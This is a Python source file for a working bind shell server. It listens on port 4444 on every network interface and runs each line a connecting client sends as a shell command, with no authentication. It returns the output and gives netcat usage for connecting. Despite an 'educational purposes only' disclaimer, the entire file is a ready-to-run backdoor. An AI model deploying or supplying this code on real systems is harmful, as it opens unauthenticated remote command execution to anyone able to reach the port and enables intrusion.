#!/usr/bin/env python3
"""
Python Bind Shell Server

A minimalist, single-threaded TCP bind shell server.
Listens on a specified port, accepts incoming connections, and executes 
received strings as system shell commands. Combines stdout and stderr, 
returning the complete output to the connected client. Includes a timeout 
mechanism to prevent the server from hanging on interactive commands.
You can adjust the `PORT` and `TIMEOUT` constants to change the listening port
and command timeout duration.
    
Usage:
    Start the server: python bind_shell.py
    Connect to the server: nc ip_address listening_port

Disclaimer: 
    This code is for educational purposes only. Use it at your own risk. 
"""

import socket
import subprocess

PORT = 4444
TIMEOUT = 10
BANNER = "Connected to the Python bind shell server.\nType your command (or 'exit' to disconnect)\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', PORT))
s.listen(1)
print(f"Server listening on port {PORT} with timeout {TIMEOUT}s")

while True:
    conn, addr = s.accept()
    client_ip = addr[0]
    client_port = addr[1]
    print(f"Connection established from {client_ip}:{client_port}")
    
    with conn, conn.makefile('r', encoding='utf-8', errors='ignore') as f:
        try:
            
            conn.sendall(BANNER.encode('utf-8'))
            for cmd in f:
                cmd = cmd.strip()
                if not cmd: 
                    continue
                if cmd.lower() == 'exit': 
                    print(f"Client {client_ip}:{client_port} disconnected.")
                    break
                
                try:
                    out = subprocess.run(cmd, shell=True, capture_output=True, timeout=TIMEOUT)
                    response = out.stdout + out.stderr
                    
                    if not response:
                        conn.sendall(b"\n")
                    else:
                        conn.sendall(response)
                        
                except subprocess.TimeoutExpired:
                    conn.sendall(f"Error: Command timed out after {TIMEOUT}s\n".encode())
                except Exception as e:
                    conn.sendall(f"Error: {str(e)}\n".encode())
        except Exception as e:
            print(f"Session error with {client_ip}: {str(e)}")
